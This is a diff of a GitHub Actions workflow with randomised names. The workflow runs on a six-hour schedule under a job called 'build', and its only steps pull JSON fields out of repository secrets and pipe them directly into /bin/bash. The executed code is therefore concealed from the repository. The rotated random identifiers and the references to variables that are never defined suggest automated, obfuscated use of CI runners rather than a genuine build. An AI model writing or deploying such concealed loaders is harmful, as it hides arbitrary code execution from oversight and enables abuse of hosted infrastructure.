@@ -1,8 +1,10 @@
 name: shisuanjian3489
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 3/6 * * *'
+    - cron: '4 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,18 +12,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: shisuanjian3489
         env:
-          iqo72773: ${{ secrets.iqo72773 }}
+          h24: ${{ secrets.h24 }}
         run: |
-          echo $iqo72773 | jq -r .qsop6 | /bin/bash
-          echo $gk180 | jq -r .byygx2 | /bin/bash
-          echo $aq35 | jq -r .hz767 | /bin/bash
-          echo $loxj45 | jq -r .lg40868 | /bin/bash
-          echo $snabn7 | jq -r .gl46906 | /bin/bash
-          echo $dqhn390 | jq -r .sr0 | /bin/bash
-          echo $hrwz9 | jq -r .k79116 | /bin/bash
-          echo $ejmwq48 | jq -r .roff88 | /bin/bash
-          echo $ukxf875 | jq -r .syeb64 | /bin/bash
-          echo $xvso8148 | jq -r .a85 | /bin/bash
-          echo $viq9163 | jq -r .gmpv573 | /bin/bash
-          echo $e01 | jq -r .xkqja68120 | /bin/bash
+          echo $h24 | jq -r .nzqaq2 | /bin/bash
+          echo $uu099 | jq -r .jz52241 | /bin/bash
+          echo $s668 | jq -r .kpmhf3 | /bin/bash
+          echo $c06 | jq -r .mtf93828 | /bin/bash
+          echo $sbkqq3 | jq -r .ageo96963 | /bin/bash
 
